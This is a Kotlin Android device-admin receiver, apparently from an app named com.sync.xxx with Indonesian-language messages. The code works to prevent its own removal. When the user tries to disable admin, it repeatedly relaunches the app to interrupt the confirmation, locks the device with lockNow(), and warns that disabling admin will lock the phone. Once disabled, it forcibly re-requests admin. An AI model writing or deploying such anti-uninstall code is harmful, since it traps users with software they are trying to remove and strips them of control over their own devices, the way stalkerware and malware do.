package com.sync.xxx

import android.app.admin.DeviceAdminReceiver
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.widget.Toast

class AntiUninstallReceiver : DeviceAdminReceiver() {

    override fun onEnabled(context: Context, intent: Intent) {
        super.onEnabled(context, intent)
        Toast.makeText(context, "Admin aktif — proteksi terpasang", Toast.LENGTH_SHORT).show()
    }

    override fun onDisableRequested(context: Context, intent: Intent): CharSequence {
        // Re-launch app immediately so the disable confirmation is interrupted
        val launch = context.packageManager
            .getLaunchIntentForPackage(context.packageName)?.apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP or Intent.FLAG_ACTIVITY_CLEAR_TASK)
            }
        if (launch != null) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                try {
                    val pending = android.app.PendingIntent.getActivity(
                        context, 0, launch,
                        android.app.PendingIntent.FLAG_IMMUTABLE or android.app.PendingIntent.FLAG_UPDATE_CURRENT
                    )
                    pending.send()
                } catch (_: Exception) {
                    context.startActivity(launch)
                }
            } else {
                context.startActivity(launch)
            }
        }

        // Also try to force-lock if we still have admin for a short window
        try {
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val admin = ComponentName(context, AntiUninstallReceiver::class.java)
            if (dpm.isAdminActive(admin)) {
                dpm.lockNow()
            }
        } catch (_: Exception) {}

        // Schedule another re-launch shortly after
        Handler(Looper.getMainLooper()).postDelayed({
            try {
                val again = context.packageManager
                    .getLaunchIntentForPackage(context.packageName)?.apply {
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
                    }
                if (again != null) context.startActivity(again)
            } catch (_: Exception) {}
        }, 400)

        return "Aplikasi ini dilindungi. Nonaktifkan admin akan mengunci perangkat."
    }

    override fun onDisabled(context: Context, intent: Intent) {
        super.onDisabled(context, intent)
        // Immediately try to re-request admin on next opportunity
        Handler(Looper.getMainLooper()).postDelayed({
            try {
                AntiUninstallHelper.requestAdminIfNeeded(context, force = true)
            } catch (_: Exception) {}
        }, 800)
    }
}
